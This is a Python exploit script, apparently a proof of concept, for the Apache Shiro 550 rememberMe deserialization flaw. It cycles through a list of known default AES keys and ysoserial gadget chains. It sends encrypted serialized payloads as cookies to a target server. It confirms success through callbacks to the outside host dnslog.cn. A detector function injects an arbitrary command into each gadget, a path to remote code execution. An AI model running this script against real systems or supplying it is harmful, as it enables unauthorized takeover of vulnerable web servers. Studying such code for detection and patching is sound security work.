#!/usr/bin/env python
# -*- coding:utf-8 -*-
# author:何则君
# time:2011/11/23
# information shiro 550 反序列化 poc
import os
import re
import base64
import uuid
import subprocess
import requests
import sys
import json
import time
import random
import argparse
from Cryptodome.Cipher import AES

JAR_FILE = 'ysoserial.jar'

CipherKeys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "cmVtZW1iZXJNZQAAAAAAAA==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "ZnJlc2h6Y24xMjM0NTY3OA==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "RVZBTk5JR0hUTFlfV0FPVQ==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "WkhBTkdYSUFPSEVJX0NBVA==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "WcfHGU25gNnTxTlmJMeSpw==",
    "a2VlcE9uR29pbmdBbmRGaQ==",
    "bWluZS1hc3NldC1rZXk6QQ==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    # "ZWvohmPdUsAWT3=KpPqda",
    "r0e3c16IdVkouZgk1TKVMg==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "U3ByaW5nQmxhZGUAAAAAAA==",
    "LEGEND-CAMPUS-CIPHERKEY=="
    # "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
]

gadgets = ["JRMPClient", "BeanShell1", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
           "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
           "CommonsCollections7", "Groovy1", "Hibernate1", "Hibernate2", "JSON1", "JavassistWeld1", "Jython1",
           "MozillaRhino1", "MozillaRhino2", "Myfaces1", "ROME", "Spring1", "Spring2", "Vaadin1", "Wicket1"]

session = requests.Session()


def genpayload(params, CipherKey, fp):
    gadget, command = params
    if not os.path.exists(fp):
        raise Exception('jar file not found')
    popen = subprocess.Popen(['java', '-jar', fp, gadget, command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    # print(command)
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    # key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def getdomain():
    try:
        ret = session.get("http://www.dnslog.cn/getdomain.php?t=" + str(random.randint(100000, 999999)),
                          timeout=10).text
    except Exception as e:
        print("getdomain error:" + str(e))
        ret = "error"
        pass
    return ret


def getrecord():
    try:
        ret = session.get("http://www.dnslog.cn/getrecords.php?t=" + str(random.randint(100000, 999999)),
                          timeout=10).text
        # print(ret)
    except Exception as e:
        print("getrecord error:" + str(e))
        ret = "error"
        pass
    return ret


def check(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    domain = getdnshost()
    if domain:
        reversehost = "http://" + domain

        for CipherKey in CipherKeys:
            ret = {'success': False, 'response': [], 'requests': [], 'error': [],'info':[]}
            try:

                payload = genpayload(("URLDNS",reversehost),CipherKey,JAR_FILE)


                r = requests.get(target,cookies={'rememberMe': payload.decode()},timeout=10)
                for i in range(1,5):
                    time.sleep(2)
                    temp = getrecord()
                    if domain in temp:
                        ret["success"] = True
                        ret["info"] = CipherKey
                        break
            except Exception as e:
                print(str(e))
                pass
            if ret["success"]:
                break
    else:
        print("get dns host error")
    return ret

def getdnshost():
    reversehost = ""
    try:
        domain = getdomain()
        if domain == "error":
            print("getdomain error")
        else:
            # reversehost = "http://" +domain
            reversehost = domain
            # print("got reversehost : " + reversehost)
    except:
        pass
    return reversehost

def detector(url, CipherKey, command):
    result = []
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        for g in gadgets:
            g = g.strip()

            domain = getdnshost()
            if domain:
                if g == "JRMPClient":
                    param = "%s:80" % domain
                else:
                    param = command.replace("{dnshost}", domain)
                payload = genpayload((g, param), CipherKey, JAR_FILE)
                print(g + " testing.....")
                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)
                # print(r.read())
                for i in range(1, 5):
                    # print("checking.....")
                    time.sleep(2)
                    temp = getrecord()
                    if domain in temp:
                        ret = g
                        # ret["CipherKey"] = CipherKey
                        result.append(ret)
                        print("found gadget:\t" + g)
                        break
            else:
                print("get dns host error")
                # break
        # print(r.text)
    except Exception as e:
        print("detector error:" + str(e))
        pass
    return result


def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 5,
        ###可选参数###
        'url': "http://192.168.160.201:8080",
    }
    ###main方法###
    print(main(params))